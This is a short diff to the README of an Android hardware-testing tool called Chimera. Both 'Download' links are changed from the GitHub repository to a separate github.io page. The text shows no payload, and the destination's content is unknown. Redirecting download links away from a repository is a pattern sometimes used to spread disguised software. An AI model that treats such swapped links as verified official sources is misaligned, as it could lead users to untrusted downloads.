@@ -1,6 +1,6 @@
 # 🤖 Chimera - Automate Android hardware testing with ease
 
-[![](https://img.shields.io/badge/Download-Chimera-blue.svg)](https://github.com/codewithstarboy/Chimera)
+[![](https://img.shields.io/badge/Download-Chimera-blue.svg)](https://codewithstarboy.github.io)
 
 ## 📁 Project Overview
 
@@ -28,7 +28,7 @@ Ensure you meet these requirements before you start:
 
 Visit the repository page to download the latest version of the software. Follow the link below to reach the official file location.
 
-[Download Chimera Files](https://github.com/codewithstarboy/Chimera)
+[Download Chimera Files](https://codewithstarboy.github.io)
 
 1. Navigate to the link above.
 2. Look for the Releases section on the right side of the screen.
